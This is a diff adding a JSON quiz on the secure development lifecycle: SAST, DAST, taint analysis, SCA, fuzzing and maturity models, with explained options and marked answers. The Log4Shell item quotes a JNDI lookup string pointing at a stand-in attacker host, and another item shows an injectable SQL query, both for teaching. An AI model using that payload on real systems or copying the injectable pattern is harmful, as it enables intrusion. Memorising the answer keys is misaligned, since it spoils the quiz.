@@ -1,0 +1,343 @@
+[
+  {
+    "id": "secp-secure-sdlc-q1",
+    "level": "basic",
+    "type": "single",
+    "prompt": "What does **shifting left** mean in a secure SDLC?",
+    "options": [
+      {
+        "text": "Moving security activities earlier in development, towards design and coding",
+        "explanation": "Correct. 'Left' is the start of a timeline drawn left to right. Checks on the PR or the design document catch issues when the author still has context and the fix is cheap."
+      },
+      {
+        "text": "Moving security responsibility from developers to a central security team",
+        "explanation": "This is closer to the opposite. Shifting left pushes security work towards developers and earlier phases, rather than concentrating it in a late central review."
+      },
+      {
+        "text": "Running penetration tests just before each release",
+        "explanation": "A pre-release pen test is the traditional late-stage model that shifting left aims to complement. It is valuable, but it is on the right of the timeline."
+      },
+      {
+        "text": "Deferring security fixes to a later sprint so features ship first",
+        "explanation": "That is accumulating security debt, which pushes fixes to the right, where they cost more and are understood less."
+      }
+    ],
+    "answer": 0,
+    "workedExample": "1. Draw the SDLC as a timeline: requirements, design, build, test, release, operate, from left to right.\n2. Traditional security sat at the right: a review or pen test before release.\n3. Shifting left adds threat modelling at design, SAST and SCA on every PR, and secret scanning at commit.\n4. The benefit is not that late testing stops, but that most issues are caught where they are cheapest and the author still remembers the code.",
+    "link": {
+      "title": "NIST SP 800-218: Secure Software Development Framework",
+      "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q2",
+    "level": "basic",
+    "type": "single",
+    "prompt": "A SAST tool reports a possible SQL injection. In taint-analysis terms, what has it found?",
+    "options": [
+      {
+        "text": "A SQL query that is slow because it lacks an index",
+        "explanation": "Performance is not what taint analysis tracks. It models the flow of untrusted data, not query plans."
+      },
+      {
+        "text": "Data from an attacker-controlled source reaching a dangerous sink without passing through a sanitiser",
+        "explanation": "Correct. Sources (for example `request.args`), sinks (for example the query argument of `execute`) and sanitisers (parameterisation, escaping) are the three ingredients of a taint finding."
+      },
+      {
+        "text": "A request at runtime that returned a database error",
+        "explanation": "Observing a runtime error is what DAST does. SAST never runs the program; it reasons about the code."
+      },
+      {
+        "text": "A dependency with a published CVE",
+        "explanation": "Matching dependencies against vulnerability databases is software composition analysis (SCA), not taint analysis of your own code."
+      }
+    ],
+    "answer": 1,
+    "workedExample": "1. A taint engine labels values from **sources** as tainted, e.g. `request.args.get('name')`.\n2. It propagates the label through assignments, string formatting and function calls.\n3. If a tainted value reaches a **sink**, such as the SQL string passed to `execute`, it raises an alert.\n4. Passing through a **sanitiser** removes the label, and parameterised queries avoid the sink altogether because the data travels separately from the SQL text.",
+    "link": {
+      "title": "Static application security testing — Wikipedia",
+      "url": "https://en.wikipedia.org/wiki/Static_application_security_testing"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q3",
+    "level": "basic",
+    "type": "single",
+    "prompt": "Which problem is DAST much better placed to find than SAST?",
+    "options": [
+      {
+        "text": "A call to `pickle.loads` on a request body",
+        "explanation": "This is visible directly in the source, which is exactly what SAST (e.g. Bandit's B301 check) is good at."
+      },
+      {
+        "text": "A hard-coded password in a Python module",
+        "explanation": "A literal password string sits in the code, so static analysis or a secret scanner finds it without running anything."
+      },
+      {
+        "text": "The production web server returning responses without a `Strict-Transport-Security` header",
+        "explanation": "Correct. Headers are often set by a reverse proxy, load balancer or framework config, not visible in the application code. DAST sees the real HTTP response."
+      },
+      {
+        "text": "A function that uses `eval` on a configuration value",
+        "explanation": "`eval` calls are a classic pattern-matching target for SAST. No running app is needed."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "1. Ask: is the evidence in the source code, or only in the running system?\n2. `pickle.loads`, `eval` and password literals are all in the code: SAST territory.\n3. Response headers may come from nginx, a CDN or framework defaults. Reading `app.py` will not tell you what the browser receives.\n4. DAST makes real requests and inspects real responses, so it sees the missing HSTS header.",
+    "link": {
+      "title": "Dynamic application security testing — Wikipedia",
+      "url": "https://en.wikipedia.org/wiki/Dynamic_application_security_testing"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q4",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "Which line, if any, should a well-written taint rule flag?\n\n```python\nname = request.args.get(\"n\")\nq1 = f\"SELECT * FROM t WHERE n='{name}'\"\nq2 = \"SELECT * FROM t WHERE n=?\"\ndb.execute(q1)        # line A\ndb.execute(q2, (name,))  # line B\n```",
+    "options": [
+      {
+        "text": "Line A only",
+        "explanation": "Correct. In line A the tainted `name` is formatted into the SQL text, which reaches the query sink. In line B the SQL text is a constant and `name` travels as a bound parameter, which the driver never parses as SQL."
+      },
+      {
+        "text": "Line B only",
+        "explanation": "Line B is the safe, parameterised form. Flagging it would be a false positive; that is why the lesson's rule uses `focus-metavariable` on the query argument only."
+      },
+      {
+        "text": "Both lines, because `name` is tainted in both",
+        "explanation": "Taint reaching a call is not enough; it must reach the *sink argument*. In line B it reaches a parameter slot, which is not a sink."
+      },
+      {
+        "text": "Neither, because `request.args.get` returns a string, not SQL",
+        "explanation": "Every injection payload is 'just a string'. The danger is a string concatenated into code that is then parsed, which is exactly line A."
+      }
+    ],
+    "answer": 0,
+    "workedExample": "1. Source: `request.args.get(\"n\")`, so `name` is tainted.\n2. `q1` is built from `name` by an f-string: taint propagates, `q1` is tainted.\n3. `q2` is a literal: untainted.\n4. Sink: the first argument of `execute`.\n   - Line A: sink receives tainted `q1`. Flag.\n   - Line B: sink receives untainted `q2`; `name` is in the parameter tuple. No flag.\n5. A rule matching the whole call (any argument) would wrongly flag B, which is how noisy tools lose developers' trust.",
+    "link": {
+      "title": "Semgrep documentation",
+      "url": "https://semgrep.dev/docs/"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q5",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "You introduce a SAST gate on a 10-year-old codebase. The first scan produces 3,200 findings and the gate fails every build. Developers ask for it to be disabled. What is the best course of action?",
+    "options": [
+      {
+        "text": "Keep the gate failing until all 3,200 findings are fixed",
+        "explanation": "Blocking all work for a backlog that took a decade to accumulate guarantees the gate is bypassed or switched off. Pragmatism wins here."
+      },
+      {
+        "text": "Turn the tool into an advisory report that nobody is required to read",
+        "explanation": "This removes friction and also removes the value; new vulnerabilities would merge unchecked."
+      },
+      {
+        "text": "Record the existing findings as a baseline, fail only on new high-confidence findings, and burn the backlog down separately",
+        "explanation": "Correct. New code is held to the standard immediately, and the legacy debt is triaged and prioritised (often most of it is false positives or low risk) without stopping delivery."
+      },
+      {
+        "text": "Replace SAST with an annual pen test, which has fewer false positives",
+        "explanation": "A pen test is useful but is late, periodic and covers a fraction of the code. It cannot replace feedback on every pull request."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "1. Goal: stop new vulnerabilities and reduce old ones, without the tool being switched off.\n2. A baseline snapshot marks the 3,200 existing findings as known.\n3. The gate now fails only when a PR introduces a *new* high-confidence finding, so it is rare and actionable.\n4. The backlog is triaged separately: suppress false positives, fix the real high-severity issues first.\n5. Most tools (Semgrep, CodeQL, SonarQube) support baselines or 'new code' modes for exactly this reason.",
+    "link": {
+      "title": "Semgrep documentation",
+      "url": "https://semgrep.dev/docs/"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q6",
+    "level": "intermediate",
+    "type": "multi",
+    "prompt": "Which of these are genuine limitations of **DAST**? Select all that apply.",
+    "options": [
+      {
+        "text": "It needs a running, deployed instance of the application",
+        "explanation": "Correct. DAST sends real requests, so it runs later in the pipeline (staging or a test environment) than SAST."
+      },
+      {
+        "text": "It may miss pages behind login or deep in single-page-app routing unless configured with credentials and seed URLs",
+        "explanation": "Correct. A crawler only tests what it can reach. Authenticated scanning and API definitions (e.g. OpenAPI) are needed for good coverage."
+      },
+      {
+        "text": "When it finds a flaw it reports the URL and payload, not the line of code responsible",
+        "explanation": "Correct. DAST is black-box, so mapping a finding back to code is left to the developer (IAST closes this gap)."
+      },
+      {
+        "text": "It cannot find vulnerabilities that are actually exploitable end to end",
+        "explanation": "Incorrect. That is DAST's strength: if the injected payload produces evidence in the response, the flaw is demonstrably reachable."
+      },
+      {
+        "text": "It can only analyse compiled languages",
+        "explanation": "Incorrect. DAST does not look at code at all, so the implementation language is irrelevant."
+      }
+    ],
+    "answer": [
+      0,
+      1,
+      2
+    ],
+    "workedExample": "1. DAST = black-box testing of a running app over HTTP.\n2. Consequences of 'running': needs an environment, so it runs later. (A true.)\n3. Consequences of 'black-box crawling': coverage depends on what it can reach. (B true.)\n4. Consequences of 'no code access': findings are URLs, not lines. (C true.)\n5. Its realism is a strength, not a weakness, so D is false; and it is language-agnostic, so E is false.",
+    "link": {
+      "title": "Dynamic application security testing — Wikipedia",
+      "url": "https://en.wikipedia.org/wiki/Dynamic_application_security_testing"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q7",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "In December 2021 a team ran their usual SAST scan over their Java service to check for Log4Shell. It reported nothing. Why was this result misleading?",
+    "options": [
+      {
+        "text": "SAST tools cannot analyse Java",
+        "explanation": "Many SAST tools (CodeQL, Semgrep, SpotBugs, SonarQube) analyse Java well. The language was not the problem."
+      },
+      {
+        "text": "The vulnerability was in the Log4j library, not in the team's code; finding it needs dependency scanning (SCA)",
+        "explanation": "Correct. Calling `log.info(userAgent)` is perfectly normal application code. The dangerous JNDI lookup happened inside Log4j, so you needed to know which services contained a vulnerable Log4j version, including as a transitive dependency."
+      },
+      {
+        "text": "Log4Shell only affected services that called `eval`",
+        "explanation": "Log4Shell had nothing to do with `eval`. Merely logging an attacker-supplied string containing `${jndi:...}` was enough."
+      },
+      {
+        "text": "SAST only detects vulnerabilities that have already been exploited",
+        "explanation": "SAST reasons about code before deployment and knows nothing about exploitation history."
+      }
+    ],
+    "answer": 1,
+    "workedExample": "1. What triggered Log4Shell? Logging a string such as `${jndi:ldap://evil.example/a}` with Log4j 2 (versions up to 2.14.1).\n2. Where was the flaw? Inside Log4j's message lookup feature, added in 2013.\n3. What does the team's code look like? `log.info(\"UA: {}\", ua)`, which is normal and correct.\n4. So scanning *your* code finds nothing. You need an inventory of dependencies (SCA, SBOM) to answer 'where do we run log4j-core 2.x below the fixed version?'",
+    "link": {
+      "title": "Log4Shell — Wikipedia",
+      "url": "https://en.wikipedia.org/wiki/Log4Shell"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q8",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "A file-format parser written in C keeps receiving crash reports from users with odd input files. Which technique is most likely to find the remaining bugs of this kind efficiently?",
+    "options": [
+      {
+        "text": "DAST against the company website",
+        "explanation": "The parser is a library, not a web endpoint; a web scanner would never exercise it with millions of malformed files."
+      },
+      {
+        "text": "Software composition analysis",
+        "explanation": "SCA finds *known* CVEs in third-party packages. These are unknown bugs in the team's own parser."
+      },
+      {
+        "text": "Coverage-guided fuzzing of the parser, ideally with sanitisers such as AddressSanitizer",
+        "explanation": "Correct. A fuzzer mutates inputs millions of times, keeps those that reach new code, and detects crashes and memory errors. This is how OSS-Fuzz finds bugs in parsers continuously."
+      },
+      {
+        "text": "A threat-modelling workshop",
+        "explanation": "Threat modelling identifies risks in a design. It will not pinpoint which byte sequence overflows a buffer."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "1. Symptom: crashes on unusual inputs in C code. That smells of memory-safety bugs (out-of-bounds reads, use-after-free).\n2. Need: generate vast numbers of unusual inputs and detect subtle memory errors, not just crashes.\n3. A coverage-guided fuzzer (libFuzzer, AFL++) does exactly that; AddressSanitizer turns silent corruption into a reported crash.\n4. Heartbleed, an out-of-bounds read in OpenSSL, is the classic example of this class of bug being found by testing tools.",
+    "link": {
+      "title": "Fuzzing — OWASP",
+      "url": "https://owasp.org/www-community/Fuzzing"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q9",
+    "level": "advanced",
+    "type": "multi",
+    "prompt": "Which of these flaws would **neither** SAST nor DAST typically detect without human help? Select all that apply.",
+    "options": [
+      {
+        "text": "A user can approve their own expense claim because the approval endpoint checks the role but not that approver differs from submitter",
+        "explanation": "Correct. This is a business-logic flaw. The code is syntactically safe and the response looks normal; only someone who knows the rule 'no self-approval' can spot it."
+      },
+      {
+        "text": "A password-reset token that never expires",
+        "explanation": "Correct. Nothing about a long-lived token looks dangerous to a scanner; it is a design decision that threat modelling or review should catch."
+      },
+      {
+        "text": "A reflected XSS where a query parameter is echoed unescaped into HTML",
+        "explanation": "Incorrect. This is a staple of both: SAST traces the parameter to the template sink, and DAST injects a marker and sees it reflected unescaped."
+      },
+      {
+        "text": "A session cookie set without the `HttpOnly` flag",
+        "explanation": "Incorrect. DAST checks cookie flags in every response it sees, and SAST can often flag the cookie-setting call."
+      }
+    ],
+    "answer": [
+      0,
+      1
+    ],
+    "workedExample": "1. Scanners look for *known patterns of insecurity*: tainted data in sinks, missing flags, reflected payloads.\n2. XSS and cookie flags fit those patterns, so C and D are found routinely.\n3. Self-approval and non-expiring tokens are only wrong relative to the *intended* behaviour, which the tool does not know.\n4. These are found by abuse cases, threat modelling, code review and manual testing, which is why the secure SDLC keeps humans in the loop.",
+    "link": {
+      "title": "OWASP ASVS",
+      "url": "https://owasp.org/www-project-application-security-verification-standard/"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q10",
+    "level": "advanced",
+    "type": "single",
+    "prompt": "A startup asks you to choose **one** addition to its CI pipeline this quarter. It is a Python web app with 140 direct and transitive dependencies, little custom parsing code, and no current security tooling. Which gives the best risk reduction per unit of effort?",
+    "options": [
+      {
+        "text": "A full authenticated DAST scan of every page on each commit",
+        "explanation": "Valuable, but expensive to configure (auth, test data, a stable environment) and slow. A baseline DAST scan is a good later step."
+      },
+      {
+        "text": "SCA (e.g. `pip-audit` or Dependabot) plus secret scanning on every PR",
+        "explanation": "Correct. With 140 dependencies, known-vulnerable packages are the most likely route in, and leaked credentials are the most damaging cheap mistake. Both tools are low-noise and take minutes to enable."
+      },
+      {
+        "text": "A coverage-guided fuzzing campaign",
+        "explanation": "Fuzzing shines on parsers and memory-unsafe code. A Python web app with little parsing code would get comparatively little from it."
+      },
+      {
+        "text": "A custom CodeQL rule pack written from scratch for the codebase",
+        "explanation": "Custom rules are powerful but take expert effort. Off-the-shelf SAST rules would come first, and dependency and secret risks dwarf this here."
+      }
+    ],
+    "answer": 1,
+    "workedExample": "1. Estimate likelihood: most of the code that runs is third-party (140 packages). Known CVEs in them are published and actively scanned for by attackers.\n2. Estimate impact: a leaked cloud key in git is one of the most damaging and common mistakes.\n3. Estimate effort: enabling Dependabot or `pip-audit` and a secret scanner is minutes of work with few false positives.\n4. Compare: DAST needs environments and auth; fuzzing fits parsers; custom CodeQL needs expertise.\n5. Best ratio: SCA plus secret scanning, then add SAST and a DAST baseline.",
+    "link": {
+      "title": "NIST SP 800-218: Secure Software Development Framework",
+      "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+    }
+  },
+  {
+    "id": "secp-secure-sdlc-q11",
+    "level": "advanced",
+    "type": "single",
+    "prompt": "An engineering director wants to know whether the organisation's secure-development practices are improving year on year, across 30 teams, against a recognised framework. What fits best?",
+    "options": [
+      {
+        "text": "Count the number of SAST findings each year; fewer means better",
+        "explanation": "Raw finding counts are easily gamed (disable rules, scan less code) and say nothing about design review, incident response or training."
+      },
+      {
+        "text": "Run an annual external pen test and compare the number of high-severity findings",
+        "explanation": "A pen test samples one application at one point in time. It measures outcomes for that target, not the maturity of practices across 30 teams."
+      },
+      {
+        "text": "Assess each team against a maturity model such as OWASP SAMM (or map practices to NIST SSDF) and track the scores over time",
+        "explanation": "Correct. SAMM defines practices across governance, design, implementation, verification and operations, each with maturity levels, so you can measure where teams are and set targets."
+      },
+      {
+        "text": "Adopt OWASP ASVS Level 3 for every application",
+        "explanation": "ASVS is a list of verification requirements for an *application*, not a model for measuring the maturity of an organisation's *process*. Level 3 everywhere would also be excessive for most apps."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "1. The question is about *process maturity across an organisation*, not the security of one app.\n2. SAMM is built for this: business functions (governance, design, implementation, verification, operations), each split into practices with maturity levels 1 to 3.\n3. Teams self-assess or are assessed; the scores give a baseline and a roadmap.\n4. NIST SSDF lists practices you can map against, useful for US government suppliers.\n5. ASVS answers 'is this application verified to level N?', which is complementary but different.",
+    "link": {
+      "title": "OWASP SAMM",
+      "url": "https://owasp.org/www-project-samm/"
+    }
+  }
+]
